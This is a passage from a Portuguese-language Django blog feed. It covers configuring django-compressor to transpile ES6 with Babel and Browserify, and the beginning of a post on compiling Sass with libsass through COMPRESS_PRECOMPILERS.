&lt;p&gt;Vamos recaptular o processo de instalação do &lt;code&gt;django-compressor&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install django-compressor
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Não podemos esquecer de adicionar a &lt;em&gt;app&lt;/em&gt; ao &lt;code&gt;INSTALLED_APPS&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# settings.py&lt;/span&gt;
&lt;span class="n"&gt;INSTALLED_APPS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;compressor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E para finalizar, precisamos fazer os estáticos serem "encontráveis":&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# settings.py&lt;/span&gt;
&lt;span class="n"&gt;STATICFILES_FINDERS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;django.contrib.staticfiles.finders.FileSystemFinder&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;django.contrib.staticfiles.finders.AppDirectoriesFinder&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;compressor.finders.CompressorFinder&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para simplificar o nosso exemplo, vou reaproveitar o cenário criado no &lt;em&gt;post&lt;/em&gt;
anterior:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;lt;!-- index.html --&amp;gt;&lt;/span&gt;

{% load compress %}
{% load staticfiles %}

{% compress js %}
    &lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{% static &amp;#39;vendor/jquery/jquery.js&amp;#39; %}&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{% static &amp;#39;js/app.js&amp;#39; %}&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
{% endcompress %}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Imagine que o nosso arquivo &lt;code&gt;js/app.js&lt;/code&gt; é um &lt;em&gt;Javascript&lt;/em&gt;, mas escrito seguindo as
especificações do &lt;a href="https://klauslaube.com.br/tag/es6.html" title="Leia mais sobre ES6"&gt;&lt;em&gt;ES6&lt;/em&gt;&lt;/a&gt;. Podendo ser algo
semelhante ao exemplo abaixo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;createStore&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;redux&amp;#39;&lt;/span&gt;

&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;rootReducer&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;./reducers&amp;#39;&lt;/span&gt;
&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;App&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;./components/app&amp;#39;&lt;/span&gt;

&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;store&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;createStore&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;rootReducer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nx"&gt;store&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;subscribe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;subscriber&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O bloco de &lt;code&gt;{% compress js %}&lt;/code&gt; será responsável por minificar e concatenar os nossos &lt;em&gt;scripts&lt;/em&gt;.
Se executarmos o comando &lt;code&gt;manage.py compress&lt;/code&gt;, provavelmente não teremos nenhum problema,
e o &lt;a href="https://klauslaube.com.br/tag/html.html" title="Leia mais sobre HTML"&gt;&lt;em&gt;HTML&lt;/em&gt;&lt;/a&gt; de resposta será algo parecido com isso:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;lt;!-- index.html --&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/static/CACHE/js/3ffb288f8747.js&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mas o &lt;em&gt;ES6&lt;/em&gt; ainda não é amplamente suportado pelos navegadores... logo, teremos
que usar "transpiladores" para que o código seja traduzido em algo "entendível" pelos &lt;em&gt;browsers&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Hello NPM my old friend&lt;/h2&gt;
&lt;p&gt;Eu sinceramente desconheço uma ferramenta que faça &lt;a href="https://www.stevefenton.co.uk/2012/11/compiling-vs-transpiling/" title="Compiling vs Transpiling"&gt;&lt;em&gt;transpiling&lt;/em&gt;&lt;/a&gt;
de &lt;em&gt;ES6&lt;/em&gt; para &lt;em&gt;ES5&lt;/em&gt; melhor que o &lt;a href="https://babeljs.io/" title="Use next generation JavaScript, today"&gt;&lt;em&gt;Babel&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;E embora a gente "torça o nariz" para a necessidade de adicionar &lt;a href="https://klauslaube.com.br/tag/node.html" title="Leia mais sobre Node"&gt;&lt;em&gt;Node.js&lt;/em&gt;&lt;/a&gt;
à nossa &lt;em&gt;stack&lt;/em&gt; &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, o uso do &lt;em&gt;Babel&lt;/em&gt; nessas condições faz
certo sentido. Primeiro, por nos permitir escrever &lt;em&gt;Javascript&lt;/em&gt;
numa versão mais prática, legível e divertida. Segundo, que com o auxílio do
&lt;a href="http://browserify.org/" title="Browserify lets you require modules in the browser"&gt;&lt;em&gt;Browserify&lt;/em&gt;&lt;/a&gt; (por exemplo),
podemos deixar a resolução de &lt;em&gt;path&lt;/em&gt; do &lt;em&gt;JS&lt;/em&gt; nas mãos da tríade &lt;em&gt;NPM/Browserify/Babel&lt;/em&gt;
(ou você achou que aquele &lt;code&gt;import 'redux'&lt;/code&gt; veio de graça?).&lt;/p&gt;
&lt;p&gt;Isso nos permite escrever &lt;em&gt;Javascript&lt;/em&gt; modular, utilizando recursos que já são &lt;em&gt;built-in&lt;/em&gt;
(na especificação) da linguagem, sem necessariamente nos preocuparmos em como resolveremos as
questões de importação (como por exemplo, se usaremos &lt;a href="http://requirejs.org/" title="RequireJS is a JavaScript file and module loader"&gt;&lt;em&gt;RequireJS&lt;/em&gt;&lt;/a&gt;
ou &lt;a href="https://github.com/cujojs/curl" title="curl.js is small, fast, extensible module loader"&gt;&lt;em&gt;curl.js&lt;/em&gt;&lt;/a&gt;)
e deixamos toda essa responsabilidade nas mãos da ferramenta de &lt;em&gt;bundling&lt;/em&gt; de sua escolha.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/django-babel-auf-wiedersehen.png" width="620" height="258" title="Django + Babel é como dar um Auf Wiedersehen para o ES5 (fallsdownz.blogspot.com.br)" alt="Django + Babel é como dar um Auf Wiedersehen para o ES5 (fallsdownz.blogspot.com.br)"&gt;&lt;/p&gt;
&lt;p&gt;Sem mais delongas, vamos instalar as dependências que precisaremos para o nosso exemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;npm install --save-dev babelify babel-preset-es2015 redux
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Dos pacotes acima, os mais fundamentais são:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;babelify&lt;/code&gt;: Um &lt;a href="http://babeljs.io/docs/plugins/#transform" title="Babel plugins"&gt;&lt;em&gt;transform&lt;/em&gt;&lt;/a&gt; de &lt;em&gt;Babel&lt;/em&gt; para o &lt;em&gt;Browserify&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;babel-preset-es2015&lt;/code&gt;: Um &lt;em&gt;preset&lt;/em&gt; com um apanhado de &lt;em&gt;plugins&lt;/em&gt; necessários para compilar &lt;em&gt;ES2015&lt;/em&gt; para &lt;em&gt;ES5&lt;/em&gt;;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;O pacote &lt;code&gt;redux&lt;/code&gt; é apenas uma dependência utilizada pelo exemplo, e não
influencia diretamente no processo de &lt;em&gt;build&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para facilitar a comunicação entre o &lt;em&gt;Django&lt;/em&gt; e o &lt;em&gt;Babel&lt;/em&gt;, vamos criar um arquivo de configuração
&lt;code&gt;.babelrc&lt;/code&gt;, na raíz do nosso projeto, com a seguinte configuração:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;presets&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;es2015&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Voltamos ao &lt;em&gt;Django&lt;/em&gt;, para terminar de configurar o nosso projeto.&lt;/p&gt;
&lt;h2&gt;Back to the Django&lt;/h2&gt;
&lt;p&gt;Como no exemplo do &lt;em&gt;post&lt;/em&gt; anterior, vamos utilizar a capacidade de setarmos
compiladores/transpiladores, no &lt;code&gt;django-compressor&lt;/code&gt;, e passaremos a interpretar
os arquivos &lt;em&gt;Javascript&lt;/em&gt; utilizando o &lt;em&gt;Babel&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# settings.py&lt;/span&gt;
&lt;span class="n"&gt;COMPRESS_PRECOMPILERS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;text/es6&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;./node_modules/.bin/browserify {infile} -t babelify --outfile {outfile}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O &lt;em&gt;path&lt;/em&gt; &lt;code&gt;./node_modules/.bin/browserify&lt;/code&gt; é onde está o binário após ser instalado
via &lt;code&gt;npm&lt;/code&gt;. Os parâmetros &lt;code&gt;infile&lt;/code&gt; e &lt;code&gt;outfile&lt;/code&gt; dizem respeito ao arquivo de entrada e
de saída, respectivamente.&lt;/p&gt;
&lt;p&gt;Agora basta voltarmos ao nosso &lt;em&gt;template&lt;/em&gt;, e adicionarmos o atributo &lt;code&gt;type="text/es6&lt;/code&gt; à
nossa &lt;em&gt;tag&lt;/em&gt; &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;lt;!-- index.html --&amp;gt;&lt;/span&gt;

{% load compress %}
{% load staticfiles %}

{% compress js %}
    &lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{% static &amp;#39;vendor/jquery/jquery.js&amp;#39; %}&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{% static &amp;#39;js/app.js&amp;#39; %}&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/es6&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
{% endcompress %}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! Agora é só ver o resultado através do comando &lt;code&gt;python manage.py compress&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Tratando-se de uma aplicação em produção, onde é recomendado utilizar o &lt;code&gt;django-compressor&lt;/code&gt;
com &lt;a href="http://django-compressor.readthedocs.io/en/latest/scenarios/#offline-compression" title="Offline compression"&gt;&lt;em&gt;offline compression&lt;/em&gt;&lt;/a&gt;,
a adição do &lt;em&gt;Browserify&lt;/em&gt; não impactará no tempo de resposta
do seu servidor. No entanto, é certo que o servidor local, levantado através do
&lt;code&gt;manage.py runserver&lt;/code&gt;, leve um tempo maior para responder depois dessa adição.&lt;/p&gt;
&lt;p&gt;Na dúvida, não custa testar...&lt;/p&gt;
&lt;p&gt;Inicie utilizando o &lt;em&gt;Django&lt;/em&gt; com &lt;em&gt;Compressor&lt;/em&gt;. A partir do momento onde os
tempos de resposta tornem-se muito altos, opte por uma ferramenta que
&lt;a href="https://klauslaube.com.br/2016/02/22/vivendo-sem-o-grunt.html" title="Vivendo sem o Grunt"&gt;execute o &lt;em&gt;build&lt;/em&gt; em paralelo&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima!&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/babel/babelify"&gt;&lt;em&gt;Babelify - Browserify transform for Babel&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://django-compressor.readthedocs.io/en/latest/"&gt;&lt;em&gt;Django Compressor - Compresses linked and inline JavaScript or CSS into a single cached file&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="python"></category><category term="django"></category><category term="es6"></category><category term="javascript"></category><category term="babel"></category><category term="browserify"></category></entry><entry><title>Django e Sass com django-compressor</title><link href="https://klauslaube.com.br/2016/06/04/django-e-sass-com-django-compressor.html" rel="alternate"></link><published>2016-06-04T16:00:00-03:00</published><updated>2016-06-04T16:00:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2016-06-04:/2016/06/04/django-e-sass-com-django-compressor.html</id><summary type="html">&lt;p&gt;Eu sempre gostei da proposta do &lt;code&gt;django-compressor&lt;/code&gt;: Concatenar e comprimir
estáticos, utilizando como agrupadores os blocos da &lt;em&gt;engine&lt;/em&gt; de &lt;em&gt;templates&lt;/em&gt;
do &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.
Além de manter a declaração dos &lt;em&gt;assets&lt;/em&gt; no &lt;a href="https://klauslaube.com.br/tag/html.html" title="Leia mais sobre HTML"&gt;&lt;em&gt;HTML&lt;/em&gt;&lt;/a&gt;,
ele ainda abre uma margem interessante para quando você precisa customizar um grupo
de estáticos para uma determinada página …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Eu sempre gostei da proposta do &lt;code&gt;django-compressor&lt;/code&gt;: Concatenar e comprimir
estáticos, utilizando como agrupadores os blocos da &lt;em&gt;engine&lt;/em&gt; de &lt;em&gt;templates&lt;/em&gt;
do &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.
Além de manter a declaração dos &lt;em&gt;assets&lt;/em&gt; no &lt;a href="https://klauslaube.com.br/tag/html.html" title="Leia mais sobre HTML"&gt;&lt;em&gt;HTML&lt;/em&gt;&lt;/a&gt;,
ele ainda abre uma margem interessante para quando você precisa customizar um grupo
de estáticos para uma determinada página.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Com a chegada dos pré-processadores, como &lt;a href="http://sass-lang.com/" title="CSS with superpower"&gt;&lt;em&gt;Sass&lt;/em&gt;&lt;/a&gt;
e &lt;a href="http://coffeescript.org/" title="CoffeeScript is a little language that compiles into JavaScript"&gt;&lt;em&gt;CoffeeScript&lt;/em&gt;&lt;/a&gt;,
e fatalmente com o advento das ferramentas de &lt;em&gt;build&lt;/em&gt;, deixar esse processo
para o &lt;em&gt;Django&lt;/em&gt; passou a ser questionável. É extremamente razoável passar toda
essa responsabilidade para o &lt;a href="https://klauslaube.com.br/tag/grunt.html" title="Leia mais sobre Grunt"&gt;&lt;em&gt;Grunt&lt;/em&gt;&lt;/a&gt;,
e colocar apenas no seu &lt;em&gt;template&lt;/em&gt; &lt;em&gt;Django&lt;/em&gt; a &lt;em&gt;URL&lt;/em&gt; do estático já "buildado".&lt;/p&gt;
&lt;p&gt;Na minha opinião, isso tira um pouco da vantagem descrita no primeiro parágrafo,
e adiciona certa complexidade à nossa &lt;em&gt;stack&lt;/em&gt; de desenvolvimento. Baseado nisso,
e indo na &lt;a href="https://klauslaube.com.br/2016/02/22/vivendo-sem-o-grunt.html" title="Vivendo sem o Grunt"&gt;onda da simplificação de &lt;em&gt;build&lt;/em&gt;&lt;/a&gt;,
que eu resolvi devolver esse poder ao &lt;em&gt;Django&lt;/em&gt;.
E já te adianto: Estou relativamente satisfeito com o resultado!&lt;/p&gt;
&lt;h2&gt;Concat e minify sem Node.js&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Django Compressor&lt;/em&gt; é um &lt;em&gt;app&lt;/em&gt; &lt;em&gt;Django&lt;/em&gt; que comprime &lt;em&gt;Javascript&lt;/em&gt;
ou &lt;em&gt;CSS&lt;/em&gt;, em um único arquivo cacheável.&lt;/p&gt;
&lt;p&gt;Para usá-lo, começamos instalando através do &lt;code&gt;pip&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install django-compressor
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Na sequência, precisamos adicioná-lo ao arquivo de configuração do seu projeto &lt;em&gt;Django&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# settings.py&lt;/span&gt;
&lt;span class="n"&gt;INSTALLED_APPS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;compressor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Não esqueça de adicioná-lo ao &lt;code&gt;STATICFILES_FINDERS&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# settings.py&lt;/span&gt;
&lt;span class="n"&gt;STATICFILES_FINDERS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;django.contrib.staticfiles.finders.FileSystemFinder&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;django.contrib.staticfiles.finders.AppDirectoriesFinder&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;compressor.finders.CompressorFinder&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E no seu &lt;em&gt;template&lt;/em&gt; &lt;em&gt;Django&lt;/em&gt;, utilizamos a &lt;code&gt;templatetag&lt;/code&gt; de compressão
para &lt;em&gt;CSS&lt;/em&gt; e &lt;em&gt;JS&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;lt;!-- index.html --&amp;gt;&lt;/span&gt;

{% load compress %}
{% load staticfiles %}

{% compress css %}
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;link&lt;/span&gt; &lt;span class="na"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{% static &amp;#39;vendor/skeleton/normalize.css&amp;#39; %}&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/css&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;link&lt;/span&gt; &lt;span class="na"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{% static &amp;#39;vendor/skeleton/skeleton.css&amp;#39; %}&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/css&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
{% endcompress %}

{% compress js %}
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{% static &amp;#39;vendor/jquery/jquery.js&amp;#39; %}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{% static &amp;#39;js/app.js&amp;#39; %}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
{% endcompress %}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Quando o internauta acessar a sua página, o resultado final será parecido com esse:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;lt;!-- index.html --&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;link&lt;/span&gt; &lt;span class="na"&gt;rel=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/static/CACHE/css/0fb9d388202c.css&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/css&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/static/CACHE/js/82f4dc99bcc1.js&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Bacana, não? Como a opção &lt;code&gt;COMPRESS_ENABLED&lt;/code&gt; é por padrão o inverso de &lt;code&gt;DEBUG&lt;/code&gt;,
em tempo de desenvolvimento você não verá os &lt;em&gt;assets&lt;/em&gt; comprimidos,
mas em tempo de &lt;em&gt;QA&lt;/em&gt; e produção, se o seu &lt;em&gt;Django&lt;/em&gt; estiver corretamente configurado,
sim.&lt;/p&gt;
&lt;h2&gt;Pré-compiladores&lt;/h2&gt;
&lt;p&gt;Você não precisa do &lt;em&gt;Ruby&lt;/em&gt; para utilizar &lt;em&gt;Sass&lt;/em&gt;. Hoje, com o advento da especificação
do &lt;em&gt;libsass&lt;/em&gt;, é possível ter a ferramenta em diferentes linguagens, como
&lt;a href="https://klauslaube.com.br/tag/node.html" title="Leia mais sobre Node.js"&gt;&lt;em&gt;Node.js&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install libsass
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O &lt;code&gt;django-compressor&lt;/code&gt; dá suporte a execução de compiladores/transpiladores dado um
determinado &lt;code&gt;type&lt;/code&gt;. Vamos ilustrar esse cenário com o uso de &lt;em&gt;Sass&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# settings.py&lt;/span&gt;
&lt;span class="n"&gt;COMPRESS_PRECOMPILERS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;text/x-sass&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;sassc {infile} {outfile}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O binário &lt;code&gt;sassc&lt;/code&gt; foi instalado no comando &lt;code&gt;pip install&lt;/code&gt; acima. O parâmetro &lt;code&gt;infile&lt;/code&gt;
será o próprio arquivo &lt;code&gt;scss&lt;/code&gt;, e &lt;code&gt;outfile&lt;/code&gt; será a saída do arquivo, já compilado para &lt;em&gt;CSS&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/django-style.jpg" width="620" height="254" title="Django com estilo!" alt="Django com estilo!"&gt;&lt;/p&gt;
